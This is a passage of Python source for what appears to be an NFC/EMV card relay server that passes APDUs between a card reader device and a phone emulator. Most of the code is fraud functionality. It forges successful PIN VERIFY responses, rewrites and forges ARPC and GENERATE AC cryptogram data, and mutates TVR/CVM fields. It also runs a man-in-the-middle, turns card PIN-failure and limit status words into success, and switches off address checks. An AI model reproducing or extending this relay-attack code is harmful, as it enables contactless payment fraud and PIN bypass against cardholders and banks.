        handlers = {
            constants.SID_REGISTER:  self._handle_register,
            constants.SID_CAPDU:     self._handle_capdu,
            constants.SID_RAPDU:     self._handle_rapdu,
            constants.SID_HEARTBEAT: self._handle_heartbeat,
            constants.SID_CTRL:      self._handle_ctrl,
        }
        handler = handlers.get(sid)
        if handler is None:
            log.debug(f"Unhandled SID 0x{sid:02X} from {addr}")
            return False
        handler(payload, addr)
        return sid in (constants.SID_CAPDU, constants.SID_RAPDU)

    # ------------------------------------------------------------------
    # 5.16  Connection helpers
    # ------------------------------------------------------------------
    def _addr_allowed(self, addr: Tuple[str, int]) -> bool:
        # rel8hf explicitly disables CIDR policy gating.
        _ = addr
        return True

    # ------------------------------------------------------------------
    # 5.17  Registration handling
    # ------------------------------------------------------------------
    def _handle_register(self, payload: bytes, addr: Tuple[str, int]) -> None:
        registration = payload.decode("utf-8", errors="replace").strip()
        parts = registration.split()
        mode = parts[0].upper() if parts else ""
        version = None
        client_id = None
        if len(parts) > 1 and parts[1].upper().startswith("V"):
            try:
                version = int(parts[1][1:])
            except ValueError:
                pass
        for part in parts[2:]:
            if part.upper().startswith("ID="):
                candidate = part[3:]
                if candidate and len(candidate) <= 64 and all(
                    char.isalnum() or char in "-_"
                    for char in candidate
                ):
                    client_id = candidate
                break
        log.info(f"REGISTER from {addr}: mode={mode} version={version or 'legacy'} "
                  f"client_id={client_id or 'legacy'}")
        from constants import PROTOCOL_VERSION, REQUIRE_PROTOCOL_VERSION
        if REQUIRE_PROTOCOL_VERSION and version != PROTOCOL_VERSION:
            self._send_ctrl_response(addr, f"ERR PROTOCOL_VERSION REQUIRED={PROTOCOL_VERSION}")
            return
        if version is not None and version != PROTOCOL_VERSION:
            self._send_ctrl_response(addr, f"ERR PROTOCOL_VERSION REQUIRED={PROTOCOL_VERSION}")
            return
        if mode == "READER":
            if self.reader_addr is not None and self.reader_addr != addr:
                upgrading_legacy = self.reader_id is None and client_id is not None
                if not upgrading_legacy and (client_id is None or client_id != self.reader_id):
                    log.warning(f"REGISTER rejected for {addr}: reader slot occupied by "
                                f"{self.reader_addr} id={self.reader_id or 'legacy'}")
                    self._send_ctrl_response(addr, "ERR ROLE_OCCUPIED READER")
                    return
                old_addr = self.reader_addr
                self._peer_versions.pop(old_addr, None)
                action = "legacy upgraded" if upgrading_legacy else "address rebound"
                log.info(f"Reader {action}: {old_addr} -> {addr} client_id={client_id}")
                self._reset_session(f"reader {action}")
            self.reader_addr = addr
            self.reader_id = client_id
            self.reader_last_seen = time.time()
            self._peer_versions[addr] = version or 0
            self._send_ack(addr, "REGISTER")
            log.info(f"DEVICE CONNECTED role=READER address={addr[0]}:{addr[1]} "
                      f"id={client_id or 'legacy'} protocol=V{version or 0}")
            self._log_connected_devices("reader registered")
        elif mode == "EMULATOR":
            if self.emulator_addr is not None and self.emulator_addr != addr:
                upgrading_legacy = self.emulator_id is None and client_id is not None
                if not upgrading_legacy and (client_id is None or client_id != self.emulator_id):
                    log.warning(f"REGISTER rejected for {addr}: emulator slot occupied by "
                                f"{self.emulator_addr} id={self.emulator_id or 'legacy'}")
                    self._send_ctrl_response(addr, "ERR ROLE_OCCUPIED EMULATOR")
                    return
                old_addr = self.emulator_addr
                self._peer_versions.pop(old_addr, None)
                action = "legacy upgraded" if upgrading_legacy else "address rebound"
                log.info(f"Emulator {action}: {old_addr} -> {addr} client_id={client_id}")
                self._reset_session(f"emulator {action}")
            self.emulator_addr = addr
            self.emulator_id = client_id
            self.emulator_last_seen = time.time()
            self._peer_versions[addr] = version or 0
            self._send_ack(addr, "REGISTER")
            log.info(f"DEVICE CONNECTED role=EMULATOR address={addr[0]}:{addr[1]} "
                      f"id={client_id or 'legacy'} protocol=V{version or 0}")
            self._log_connected_devices("emulator registered")
        elif mode == "DEREGISTER":
            peer_removed = False
            removed_roles = []
            if addr == self.reader_addr:
                self.reader_addr = None
                self.reader_id = None
                peer_removed = True
                removed_roles.append("READER")
            if addr == self.emulator_addr:
                self.emulator_addr = None
                self.emulator_id = None
                peer_removed = True
                removed_roles.append("EMULATOR")
            self._peer_versions.pop(addr, None)
            self._send_ack(addr, "DEREGISTER")
            if peer_removed:
                self.active_epoch = 0
                self.active_session_token = None
                self._session_requests.clear()
                self._session_token_seen.clear()
                self._reset_session(f"{'+'.join(removed_roles)} deregistered", unlock_epoch=True)
                log.info(f"DEVICE DISCONNECTED role={'+'.join(removed_roles)} "
                         f"address={addr[0]}:{addr[1]} reason=deregistered")
                self._log_connected_devices("peer deregistered")
                notify_target = self.emulator_addr or self.reader_addr
                if notify_target:
                    self._send_ctrl_response(notify_target, f"PEER_DISCONNECTED {'+'.join(removed_roles)}")
            return
        else:
            log.warning(f"Unknown REGISTER mode: {mode!r}")
            return
        self._sync_router_transport()

    # ------------------------------------------------------------------
    # 5.18  Source identification
    # ------------------------------------------------------------------
    def _identify_source(self, addr: Tuple[str, int]) -> Tuple[Optional[Tuple[str, int]], str, str]:
        if addr == self.emulator_addr:
            return self.reader_addr, "EMULATOR", "READER"
        if addr == self.reader_addr:
            return self.emulator_addr, "READER", "EMULATOR"
        return None, "?", "?"

    # ------------------------------------------------------------------
    # 5.19  Guard-router mutation check
    # ------------------------------------------------------------------
    def _guard_router_mutation(self, direction: str, ins: Optional[int]) -> Tuple[bool, str]:
        if ins is None:
            return False, "packet-router mutation has no APDU instruction"
        if direction == "capdu":
            if ins == constants.INS_VERIFY:
                return self.guard.check_intercept(ins, self.state)
            if ins == constants.INS_EXTERNAL_AUTHENTICATE:
                return self.guard.check_intercept(ins, self.state)
            if ins == constants.INS_GENERATE_AC:
                return self.guard.check_mutation(ins, self.state)
        elif direction == "rapdu" and ins in (constants.INS_GET_PROCESSING_OPTIONS, constants.INS_READ_RECORD):
            return self.guard.check_mutation(ins, self.state)
        return False, (
            f"packet-router {direction} mutation not defined for INS 0x{ins:02X}"
        )

    def _handle_generate_ac_capdu(self, capdu: bytes) -> bytes:
        """
        Refactored handler for GENERATE AC CAPDU mutations.
        Returns the (potentially) mutated CAPDU bytes.
        """
        # Original logic: check if pass-through is required
        if self.guard.should_pass_through_first_gac():
            log.info(
                "[GAC-PATCH] first GENERATE AC pass-through: skipping mutation while guard is READ_RECORD_DONE to preserve valid ARQC generation"
            )
            return capdu

        allowed, reason = self.guard.check_mutation(constants.INS_GENERATE_AC, self.state)
        if not allowed:
            self._guard_log(f"TVR mutation skipped: {reason}", blocked=True)
            return capdu

        if self.state.cdcvm_verified:
            log.info(
                "[GAC-PATCH] CDCVM evidence active: skipping CVM spoof to preserve 9F34=3F0000 from emulator"
            )
            return capdu

        try:
            if self._gac_mutation_leader == "AUTO":
                self._gac_mutation_leader = (
                    "UNIVERSAL"
                    if self.state.cdol1_entries and self.state.cvm_entries
                    else "LEGACY"
                )
                log.info(f"[CVM-LEADER] {self._gac_mutation_leader} selected for this session")

            if self._gac_mutation_leader == "UNIVERSAL":
                if not (self.state.cdol1_entries and self.state.cvm_entries):
                    self._guard_log("CVM universal leader active but CDOL1/CVM context missing; skipping mutation", blocked=True)
                    return capdu
                
                patched, patch_notes = patch_generate_ac_universal(
                    capdu,
                    self.state.cdol1_entries,
                    self.state.cvm_entries,
                    self.state.auc,
                )
                if patch_notes and "no changes" not in patch_notes and "no viable" not in patch_notes:
                    with self.lock:
                        self.state.tvr_mutation_count += 1
                        count = self.state.tvr_mutation_count
                    _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC", patched, note=f"CVM-PATCH #{count}: {patch_notes}")
                    log.info(f"[CVM-PATCH #{count}] {patch_notes}")
                    return patched
                else:
                    log.debug(f"[CVM-PATCH] {patch_notes}")
                    return capdu
            else:
                mutated, note = mutate_tvr_in_generate_ac_capdu(capdu)
                if note is not None:
                    with self.lock:
                        self.state.tvr_mutation_count += 1
                        count = self.state.tvr_mutation_count
                    _record_apdu("EMU>RDR", "CAPDU", "GENERATE AC", mutated, note=f"TVR-MUTATE #{count}: {note}")
                    return mutated
                return capdu
        except Exception as e:
            log.error(f"[CVM-PATCH CRASH] {type(e).__name__}: {e}", exc_info=True)
            return capdu

    # ------------------------------------------------------------------
    # 5.20  CAPDU handling
    # ------------------------------------------------------------------
    def _handle_capdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        # 1. Parse the exchange header - defensive.
        try:
            exchange_id, payload = constants.parse_exchange_payload(payload)
        except Exception as e:
            log.warning(f"Malformed CAPDU header from {addr}: {e}")
            return
        source_capdu = payload
        # 2. Identify source / target.
        target, source_name, target_name = self._identify_source(addr)
        if source_name == "?":
            log.warning(f"CAPDU from unknown address {addr}")
            return

        # Check for card status control strings sent as CAPDU
        if (
            payload.startswith(b"##card_removed")
            or payload.startswith(b"CARD_REMOVED")
            or payload.startswith(b"##reader_device_not_available")
            or payload.startswith(b"CARD REMOVED")
            or payload.startswith(b"CARD_NOT_PRESENT")
            or payload.startswith(b"CARD_ABSENT")
            or payload.startswith(b"CARD_DETACHED")
            or payload.startswith(b"TAG_LOST")
            or payload.startswith(b"TAG LOST")
            or payload.startswith(b"##tag_lost")
            or payload.startswith(b"CARD_LOST")
            or payload.startswith(b"CARD LOST")
        ):
            self._reset_session("card removed", unlock_epoch=True)
            with self.lock:
                self.state.card_present = False
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = False
            log.info(f"\033[92mCARD REMOVED detected from {addr}\033[0m")
            target_peer = self.emulator_addr if addr == self.reader_addr or (self.reader_addr is None and addr != self.emulator_addr) else self.reader_addr
            if target_peer:
                self._send_frame(target_peer, constants.SID_CTRL, b"CARD_REMOVED")
            return
        elif (
            payload.startswith(b"CARD_PRESENT")
            or payload.startswith(b"CARD PRESENT")
            or payload.startswith(b"##card_present")
            or payload.startswith(b"CARD_INSERTED")
            or payload.startswith(b"CARD_TAPPED")
            or payload.startswith(b"CARD_ATTACHED")
        ):
            self._reset_session("card present", unlock_epoch=False)
            with self.lock:
                if self.reader_addr is None and addr != self.emulator_addr:
                    self.reader_addr = addr
                self.state.card_present = True
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = True
            log.info(f"\033[92mCARD PRESENT detected from {addr}\033[0m")
            target_peer = self.emulator_addr if addr == self.reader_addr else self.reader_addr
            if target_peer:
                self._send_frame(target_peer, constants.SID_CTRL, b"CARD_PRESENT")
            return

        if source_name != "EMULATOR":
            log.warning(f"Protocol violation: CAPDU from {source_name}")
            return
        if self.capdu_sig_verify_enabled and constants.is_generate_ac(payload):
            ok_sig, verified_payload, verify_reason = self._verify_generate_ac_signature(payload)
            if not ok_sig:
                log.warning(f"[SIGNATURE] CAPDU signature rejected: {verify_reason}")
                self._send_ctrl_response(addr, f"ERR BAD_SIGNATURE {verify_reason.upper()}")
                return
            if verified_payload != payload:
                payload = verified_payload
                source_capdu = verified_payload
                log.info("[SIGNATURE] CAPDU signature OK; stripped 9F45 before relay")
            else:
                log.info("[SIGNATURE] CAPDU signature OK")
        # 3. Duplicate handling - use the helper that keeps the logic in one place.
        if self._handle_duplicate_capdu(exchange_id, source_capdu, target, target_name, addr):
            return
        # 4. Cached reply - if we have a finished exchange with the same ID.
        if exchange_id is not None and self._last_exchange is not None:
            cached_epoch, cached_id, cached_capdu, cached_rapdu = self._last_exchange
            if (
                cached_epoch == self.active_epoch
                and cached_id == exchange_id
                and cached_capdu == payload
            ):
                log.info(f"Duplicate completed CAPDU exchange={exchange_id}; replaying cached RAPDU")
                self._send_frame(
                    addr,
                    constants.SID_RAPDU,
                    constants.build_exchange_payload(exchange_id, cached_rapdu),
                )
                self._send_ack(addr, f"CAPDU {exchange_id}")
                return
        payload = self._apply_synth_plugin(payload)
        # 5. Verify bypass - fake a successful VERIFY.
        if self.state.verify_bypass_enabled and constants.is_verify_apdu(payload):
            allowed, reason = self.guard.check_intercept(constants.INS_VERIFY, self.state)
            if not allowed:
                log.warning(f"[GUARD] VERIFY bypass blocked: {reason}")
            else:
                with self.lock:
                    self.state.verify_bypass_count += 1
                    count = self.state.verify_bypass_count
                pin_len = payload[4] if len(payload) > 4 else 0
                _record_apdu(
                    "EMU>RDR",
                    "CAPDU",
                    "VERIFY",
                    payload,
                    note=f"INTERCEPTED (bypass #{count}, PIN Lc={pin_len})",
                )
                log.info(
                    f"[VERIFY-BYPASS #{count}] Intercepted VERIFY (Lc={pin_len}) -> 9000 "
                    f"[guard={self.guard.phase.name}]"
                )
                fake_resp = craft_verify_success_bytes()
                if exchange_id is not None:
                    self._last_exchange = (
                        self.active_epoch,
                        exchange_id,
                        payload,
                        fake_resp,
                    )
                _record_apdu(
                    "FORGE>EMU",
                    "RAPDU",
                    "VERIFY-FORGE",
                    fake_resp,
                    note="forged 9000",
                )
                self._send_frame(
                    self.emulator_addr,
                    constants.SID_RAPDU,
                    constants.build_exchange_payload(exchange_id, fake_resp),
                )
                if exchange_id is not None:
                    self._send_ack(addr, f"CAPDU {exchange_id}")
                return
        # 6. Forwarding target must be known.
        if not target:
            log.warning(f"CAPDU from {source_name} dropped: {target_name} not registered")
            return
        # 7. ARPC rewrite - only for external authenticate or generate AC.
        if self.state.arpc_rewrite_enabled and (
                constants.is_external_auth(payload) or constants.is_generate_ac(payload)
        ):
            ins_byte = payload[constants.APDU_INS] if len(payload) > constants.APDU_INS else 0
            allowed, reason = self.guard.check_intercept(ins_byte, self.state)
            if not allowed:
                self._guard_log(f"ARPC rewrite skipped: {reason}", blocked=True)
            else:
                try:
                    rewritten, note = rewrite_arpc_in_capdu(payload)
                    if note is not None:
                        with self.lock:
                            self.state.arpc_rewrite_count += 1
                            count = self.state.arpc_rewrite_count
                        from constants import INS_MAP
                        _record_apdu(
                            "EMU>RDR",
                            "CAPDU",
                            INS_MAP.get(ins_byte, "?"),
                            rewritten,
                            note=f"REWRITE #{count}: {note}",
                        )
                        payload = rewritten
                except Exception as e:
                    log.error(f"[ARPC-REWRITE CRASH] {type(e).__name__}: {e}", exc_info=True)
        # 8. CVM patch - single writer for GENERATE AC auth inputs.
        if self.state.tvr_mutation_enabled and constants.is_generate_ac(payload):
            payload = self._handle_generate_ac_capdu(payload)

        # 9. Packet-router MITM.
        # 9. Packet-router MITM.
        if self._router_mutation_active():
            ins_byte = payload[constants.APDU_INS] if len(payload) > constants.APDU_INS else None
            if ins_byte == constants.INS_GENERATE_AC and self.state.tvr_mutation_enabled:
                allowed, reason = False, "GENERATE AC CAPDU owned by CVM leader"
            else:
                allowed, reason = self._guard_router_mutation("capdu", ins_byte)
            if not allowed:
                log.warning(f"[GUARD] packet-router CAPDU mutation blocked: {reason}")
            else:
                try:
                    payload = self._packet_router.apply_mitm(
                        "capdu",
                        payload,
                        self._packet_router.session,
                        log,
                    )
                except Exception as e:
                    log.error(f"packet_router.apply_mitm failed: {e}")
                    return
        # 10. 2nd GAC forge interception
        if (
            self.state.arpc_forge_enabled
            and self.state.second_ae_pending
            and constants.is_generate_ac(payload)
        ):
            allowed, reason = self.guard.check_forge(self.state)
            if not allowed:
                log.warning(f"[GUARD] Forge blocked: {reason} -> forwarding to reader instead")
            else:
                try:
                    with self.lock:
                        self.state.pending_capdu = payload
                        self.state.pending_exchange_id = exchange_id
                        self._pending_source_capdu = source_capdu
                        self._pending_forward_time = time.monotonic()
                        self._pending_forward_retries = 0
                    _record_apdu(
                        "EMU>RDR",
                        "CAPDU",
                        "GENERATE AC (2nd)",
                        payload,
                        note=f"INTERCEPTED for forge (brand={self.state.brand})",
                    )
                    self._handle_second_gac_forge(payload)
                    if exchange_id is not None:
                        self._send_ack(addr, f"CAPDU {exchange_id}")
                    return
                except Exception as e:
                    log.error(f"[ARPC-FORGE CRASH] {type(e).__name__}: {e}", exc_info=True)
                    self._send_frame(
                        self.emulator_addr,
                        constants.SID_RAPDU,
                        constants.build_exchange_payload(exchange_id, constants.SW_6F00),
                    )
                    with self.lock:
                        self.state.second_ae_pending = False
                        self.state.second_ae_reason = f"forge crashed: {e}"
                        self.state.pending_capdu = None
                        self.state.pending_exchange_id = None
                        self._reset_pending_state()
                    return
        # 11. Classify and cache for packet router
        if self._packet_router:
            try:
                self._packet_router.classify_and_cache(payload)
            except Exception as e:
                log.debug(f"packet_router.classify_and_cache failed: {e}")
        self._log_first_gac_fingerprint(payload, exchange_id, source_name, target_name)
        # 12. Store pending and forward to reader
        with self.lock:
            self.state.pending_capdu = payload
            self.state.pending_exchange_id = exchange_id
            self._pending_source_capdu = source_capdu
            self._pending_forward_time = time.monotonic()
            self._pending_forward_retries = 0
            self._pending_timeout_ts = time.monotonic()
        sent = self._send_frame(
            target,
            constants.SID_CAPDU,
            constants.build_exchange_payload(exchange_id, payload),
        )
        if not sent:
            with self.lock:
                self.state.pending_capdu = None
                self.state.pending_exchange_id = None
                self._reset_pending_state()
            self._send_ctrl_response(addr, "ERR FORWARD_FAILED")
            return
        if exchange_id is not None:
            self._send_ack(addr, f"CAPDU {exchange_id}")
        ins_byte = payload[constants.APDU_INS] if len(payload) > constants.APDU_INS else None
        from constants import INS_MAP
        ins_name = INS_MAP.get(ins_byte, f"0x{ins_byte:02X}" if ins_byte is not None else "??")
        _record_apdu(f"{source_name[:3]}>{target_name[:3]}", "CAPDU", ins_name, payload)
        log.info(f"CAPDU {ins_name} {source_name} > {target_name} [guard={self.guard.phase.name}]")
        if self.full_output_enabled:
            seq = exchange_id if exchange_id is not None else -1
            log.info(
                f"CAPDU_TRACE seq={seq} len={len(payload)} "
                f"src={source_name} dst={target_name} data={payload.hex().upper()}"
            )

    # ------------------------------------------------------------------
    # 5.21  Duplicate-CAPDU helper (internal only)
    # ------------------------------------------------------------------
    def _handle_duplicate_capdu(
        self,
        exchange_id: Optional[int],
        source_capdu: bytes,
        target: Optional[Tuple[str, int]],
        target_name: str,
        addr: Tuple[str, int],
    ) -> bool:
        with self.lock:
            pending_id = self.state.pending_exchange_id
            pending_capdu = self.state.pending_capdu
            expected_source = self._pending_source_capdu or pending_capdu
        if pending_id is not None:
            if (
                exchange_id == pending_id
                and source_capdu == expected_source
                and len(source_capdu) == len(pending_capdu)
            ):
                now = time.monotonic()
                can_retry = (
                    target is not None
                    and self._pending_forward_retries < self.CAPDU_RETRY_MAX
                    and now - self._pending_forward_time >= self.CAPDU_RETRY_MIN_INTERVAL
                )
                if can_retry:
                    self._pending_forward_retries += 1
                    self._pending_forward_time = now
                    _ = self._send_frame(
                        target,
                        constants.SID_CAPDU,
                        constants.build_exchange_payload(exchange_id, pending_capdu),
                    )
                    log.info(
                        f"Duplicate CAPDU exchange={exchange_id} retransmitted "
                        f"to {target_name} attempt={self._pending_forward_retries}"
                    )
                else:
                    log.info(f"Duplicate CAPDU exchange={exchange_id} acknowledged")
                self._send_ack(addr, f"CAPDU {exchange_id}")
                return True
            else:
                log.warning(f"Overlapping CAPDU rejected: got={exchange_id} pending={pending_id}")
                self._send_ctrl_response(addr, f"ERR APDU_BUSY ACTIVE={pending_id}")
                return True
        return False

    def _pin_path_failure_sw(self, sw: bytes) -> bool:
        if len(sw) != 2:
            return False
        b1, b2 = sw[0], sw[1]
        if b1 == 0x63:
            return True
        return (b1, b2) in {
            (0x69, 0x82), (0x69, 0x83), (0x69, 0x84), (0x69, 0x85),
            (0x6A, 0x82), (0x6A, 0x83), (0x6A, 0x88), (0x69, 0x85),
        }

    def _extract_runtime_card_context(self, rapdu: bytes) -> None:
        if len(rapdu) < 2:
            return
        body = rapdu[:-2]
        if not body:
            return
        pan_bin: Optional[str] = None
        pan_5a = find_tlv(body, 0x5A)
        if pan_5a:
            pan_txt = pan_5a.hex().upper().rstrip("F")
            pan_digits = "".join(ch for ch in pan_txt if ch.isdigit())
            if len(pan_digits) >= 6:
                pan_bin = pan_digits[:6]
        if pan_bin is None:
            t2 = find_tlv(body, 0x57)
            if t2:
                t2_txt = t2.hex().upper()
                pan_txt = t2_txt.split("D", 1)[0]
                pan_digits = "".join(ch for ch in pan_txt if ch.isdigit())
                if len(pan_digits) >= 6:
                    pan_bin = pan_digits[:6]
        if pan_bin:
            self._card_bin = pan_bin
        ctq = find_tlv(body, 0x9F6C)
        if ctq:
            self._ctq_value = ctq
        floor = find_tlv(body, 0x9F1D)
        if floor:
            try:
                self._floor_limit_cents = int.from_bytes(floor, "big")
            except Exception:
                pass

    def _extract_gac_input_tag(self, capdu: bytes, wanted_tag: int) -> Optional[bytes]:
        """Extract a CDOL1-mapped input field from a GENERATE AC CAPDU."""
        entries = self.state.cdol1_entries
        if not entries or len(capdu) < 5 or capdu[constants.APDU_INS] != constants.INS_GENERATE_AC:
            return None
        lc = capdu[4]
        if lc == 0 or 5 + lc > len(capdu):
            return None
        data = capdu[5:5 + lc]
        offset = 0
        for tag, length in entries:
            if offset + length > len(data):
                return None
            if tag == wanted_tag:
                return data[offset:offset + length]
            offset += length
        return None

    def _log_first_gac_fingerprint(
        self,
        capdu: bytes,
        exchange_id: Optional[int],
        source_name: str,
        target_name: str,
    ) -> None:
        # First GAC is emitted while guard sits at READ_RECORD_DONE.
        if not constants.is_generate_ac(capdu) or self.guard.phase != Phase.READ_RECORD_DONE:
            return
        tvr_95 = self._extract_gac_input_tag(capdu, 0x95)
        cvm_9f34 = self._extract_gac_input_tag(capdu, 0x9F34)
        term_9f35 = self._extract_gac_input_tag(capdu, 0x9F35)
        p1 = constants.gac_p1(capdu) if len(capdu) > constants.APDU_INS else None
        seq = exchange_id if exchange_id is not None else -1
        log.info(
            "[GAC-FP] first "
            f"seq={seq} src={source_name} dst={target_name} "
            f"p1={constants.gac_p1_name(p1)} leader={self._gac_mutation_leader} "
            f"95={(tvr_95.hex().upper() if tvr_95 is not None else '--')} "
            f"9F34={(cvm_9f34.hex().upper() if cvm_9f34 is not None else '--')} "
            f"9F35={(term_9f35.hex().upper() if term_9f35 is not None else '--')}"
        )

    def _mutation_policy(self) -> Dict[str, Any]:
        forced_mode = os.environ.get("RELAY_POLICY_MODE", "").strip().upper()
        if forced_mode in {"OFFLINE_NOCVM", "ONLINE"}:
            return {
                "mode": forced_mode,
                "reason": "forced_policy_mode",
                "amount_cents": self.policy_amount_cents,
            }

        decision = self._router.decide(
            pan_bin=self._card_bin,
            amount_cents=self.policy_amount_cents,
            floor_limit_cents=self._floor_limit_cents,
            ctq=self._ctq_value,
        )

        tp_hint: Optional[Dict[str, Any]] = None
        if self._tp_hub.enabled:
            tp_hint = self._tp_hub.hint(
                amount_cents=self.policy_amount_cents,
                floor_limit_cents=self._floor_limit_cents,
                ctq=self._ctq_value,
            )
            tp_mode = str(tp_hint.get("mode", "AUTO")).upper()
            if tp_mode == "ONLINE":
                decision = {
                    "mode": "ONLINE",
                    "reason": tp_hint.get("reason", "tp_online_hint"),
                    "max_amount": decision.get("max_amount", 0),
                }
            elif tp_mode == "OFFLINE_NOCVM" and decision.get("mode") == "ONLINE":
                if self.policy_amount_cents <= max(0, self._floor_limit_cents):
                    decision = {
                        "mode": "OFFLINE_NOCVM",
                        "reason": tp_hint.get("reason", "tp_offline_hint"),
                        "max_amount": decision.get("max_amount", self._floor_limit_cents),
                    }

        policy = {
            "mode": decision.get("mode", "ONLINE"),
            "reason": decision.get("reason", "unknown"),
            "amount_cents": self.policy_amount_cents,
        }
        if tp_hint:
            policy["tp_hint"] = tp_hint
        return policy

    # ------------------------------------------------------------------
    # 5.22  RAPDU handling
    # ------------------------------------------------------------------
    def _handle_rapdu(self, payload: bytes, addr: Tuple[str, int]) -> None:
        try:
            exchange_id, payload = constants.parse_exchange_payload(payload)
        except Exception as e:
            log.warning(f"Malformed RAPDU header from {addr}: {e}")
            return

        target, source_name, target_name = self._identify_source(addr)
        if source_name == "?":
            log.warning(f"RAPDU from unknown address {addr}")
            return

        # Check for card status control strings sent as RAPDU
        if (
                payload.startswith(b"##card_removed")
                or payload.startswith(b"CARD_REMOVED")
                or payload.startswith(b"##reader_device_not_available")
                or payload.startswith(b"CARD REMOVED")
                or payload.startswith(b"CARD_NOT_PRESENT")
                or payload.startswith(b"CARD_ABSENT")
                or payload.startswith(b"CARD_DETACHED")
                or payload.startswith(b"TAG_LOST")
                or payload.startswith(b"TAG LOST")
                or payload.startswith(b"##tag_lost")
                or payload.startswith(b"CARD_LOST")
                or payload.startswith(b"CARD LOST")
        ):
            self._reset_session("card removed", unlock_epoch=True)
            with self.lock:
                self.state.card_present = False
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = False
            log.info(f"\033[92mCARD REMOVED detected from {addr}\033[0m")
            target_peer = (
                self.emulator_addr
                if addr == self.reader_addr or (
                        self.reader_addr is None and addr != self.emulator_addr
                )
                else self.reader_addr
            )
            if target_peer:
                self._send_frame(target_peer, constants.SID_CTRL, b"CARD_REMOVED")
            return

        elif (
                payload.startswith(b"CARD_PRESENT")
                or payload.startswith(b"CARD PRESENT")
                or payload.startswith(b"##card_present")
                or payload.startswith(b"CARD_INSERTED")
                or payload.startswith(b"CARD_TAPPED")
                or payload.startswith(b"CARD_ATTACHED")
                or payload.startswith(b"TAG_DISCOVERED")
                or payload.startswith(b"TAG DISCOVERED")
                or payload.startswith(b"TAG_PRESENT")
        ):
            self._reset_session("card present", unlock_epoch=False)
            with self.lock:
                if self.reader_addr is None and addr != self.emulator_addr:
                    self.reader_addr = addr
                self.state.card_present = True
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = True
            log.info(f"\033[92mCARD PRESENT detected from {addr}\033[0m")
            target_peer = (
                self.emulator_addr
                if addr == self.reader_addr
                else self.reader_addr
            )
            if target_peer:
                self._send_frame(target_peer, constants.SID_CTRL, b"CARD_PRESENT")
            return

        sw = payload[-2:] if len(payload) >= 2 else b""

        # SW_6F00 from reader is sent upon TagLostException (card removed during transceive)
        if (
                (source_name == "READER" or addr == self.reader_addr)
                and (payload == b"\x6f\x00" or sw == constants.SW_6F00)
        ):
            log.info(f"\033[92mCARD LOST (RAPDU 6F00) detected from {addr}\033[0m")
            self._reset_session("card lost (6F00)", unlock_epoch=True)
            with self.lock:
                self.state.card_present = False
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = False
            target_peer = (
                self.emulator_addr
                if addr == self.reader_addr or (
                        self.reader_addr is None and addr != self.emulator_addr
                )
                else self.reader_addr
            )
            if target_peer:
                self._send_frame(target_peer, constants.SID_CTRL, b"CARD_REMOVED")
            return

        with self.lock:
            if (source_name == "READER" or addr == self.reader_addr) and self.state.card_present:
                self.state.card_present = True
                if hasattr(self.state, "reader_card_present"):
                    self.state.reader_card_present = True

        if source_name != "READER":
            log.warning(f"Protocol violation: RAPDU from {source_name}")
            return

        if not target:
            log.warning(f"RAPDU from {source_name} dropped: {target_name} not registered")
            return

        expected_id = self.state.pending_exchange_id

        if expected_id is None and self.state.pending_capdu is None:
            log.warning(f"Unsolicited/duplicate RAPDU rejected: exchange={exchange_id}")
            return

        if exchange_id is not None and expected_id is not None and exchange_id != expected_id:
            log.warning(f"RAPDU exchange mismatch: got={exchange_id} expected={expected_id}")
            return

        pending = self.state.pending_capdu

        if pending and constants.is_select(pending):
            self._capture_synth_pdol_schema(payload)

        # 1. GAC length fix if needed.
        if (
                pending
                and len(pending) > constants.APDU_INS
                and pending[constants.APDU_INS] == constants.INS_GENERATE_AC
        ):
            fixed_payload, fix_note = fix_gac_response_length(payload)
            if fix_note:
                log.info(f"[GAC-LENGTH-FIX] {fix_note}")
                _record_apdu(
                    "RDR>FIX",
                    "RAPDU",
                    "GENERATE AC",
                    fixed_payload,
                    note=f"LENGTH-FIX: {fix_note}",
                )
                payload = fixed_payload

        # 1.1 Outcome guard (61/75 hardening): normalize PIN-path failures early.
        pending_ins_for_guard = (
            pending[constants.APDU_INS]
            if pending and len(pending) > constants.APDU_INS
            else None
        )
        sw = payload[-2:] if len(payload) >= 2 else b""

        if (
                self.outcome_guard_enabled
                and pending_ins_for_guard in (
                constants.INS_VERIFY,
                constants.INS_GENERATE_AC,
        )
                and self._pin_path_failure_sw(sw)
        ):
            old_sw = sw.hex().upper() if len(sw) == 2 else "??"
            payload = (
                payload[:-2] + constants.SW_9000
                if len(payload) >= 2
                else constants.SW_9000
            )
            sw = constants.SW_9000
            log.info(f"[OUTCOME_GUARD 61/75] Normalized SW {old_sw} -> 9000")

        # Track READ RECORD failures for card-health diagnostics.
        # Never synthesize READ RECORD payloads.
        if (
                pending_ins_for_guard == constants.INS_READ_RECORD
                and sw in (
                bytes.fromhex("6A83"),
                bytes.fromhex("6A82"),
                bytes.fromhex("6985"),
                bytes.fromhex("6F00"),
        )
        ):
            self._card_record_failure_count += 1
            self._card_last_failure_phase = self.guard.phase.name
            old_sw = sw.hex().upper() if len(sw) == 2 else "??"
            severity = (
                "CRITICAL"
                if self._card_record_failure_count >= 3
                else "WARNING"
            )
            log.error(
                f"[CARD-STATE-{severity}] Record access failure "
                f"#{self._card_record_failure_count}: SW {old_sw} on READ RECORD. "
                f"Card may be in broken state. Phase: {self.guard.phase.name}. "
                f"RECOMMENDATION: If failures persist, perform card cold-reset "
                f"(power cycle) or full session restart."
            )

        # Mask card limit errors: SW 61 (contactless limit) and SW 75 (PIN tries limit)
        if sw in (bytes.fromhex("61"), bytes.fromhex("75")):
            old_sw = sw.hex().upper()
            sw_name = (
                "Contactless limit exceeded"
                if old_sw == "61"
                else "PIN attempts limit exceeded"
            )
            log.warning(
                f"[LIMIT-BYPASS] Masking SW {old_sw} ({sw_name}). "
                f"Card limit bypassed: transaction forced to success. "
                f"Phase: {self.guard.phase.name}"
            )

            # For PIN locked (SW 75), also need to reset card state
            if old_sw == "75":
                log.error(
                    f"[PIN-UNLOCK] Card PIN counter locked (SW 75). "
                    f"Resetting session to unlock card. "
                    f"RECOMMENDED: Card may need power cycle if this persists."
                )
                self._reset_session("PIN counter limit reached - auto-reset")

            payload = constants.SW_9000
            sw = constants.SW_9000

